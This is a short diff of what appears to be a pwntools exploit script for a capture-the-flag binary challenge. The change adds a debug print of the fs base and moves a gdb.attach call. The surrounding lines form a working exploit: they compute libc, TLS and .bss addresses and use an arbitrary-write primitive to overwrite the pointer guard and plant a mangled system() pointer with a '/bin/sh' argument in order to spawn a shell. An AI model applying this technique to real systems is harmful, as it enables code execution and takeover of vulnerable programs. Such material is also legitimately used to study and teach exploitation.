@@ -71,6 +71,7 @@ fs_0x30 = fsbase + 0x30
 controllable_addr = libc_base - 0x2aaaa26a8000 + 0x500 # .bss address 
 bin_sh_addr = libc_base + 0x1d8698
 
+print(hex(fsbase))
 print(hex(controllable_addr))
 def arbitrary_write(addr, target):
     payload = flat(
@@ -86,10 +87,12 @@ def arbitrary_write(addr, target):
 
 
 arbitrary_write(fs_neg0x58, p64(controllable_addr))
+
+#gdb.attach(p, s)
 arbitrary_write(fs_0x30, p64(0x0))
 
 arbitrary_write(controllable_addr, p64(sys_addr << 0x11))
-gdb.attach(p, s)
+
 arbitrary_write(controllable_addr + 0x8, p64(bin_sh_addr))
 
 payload = flat(
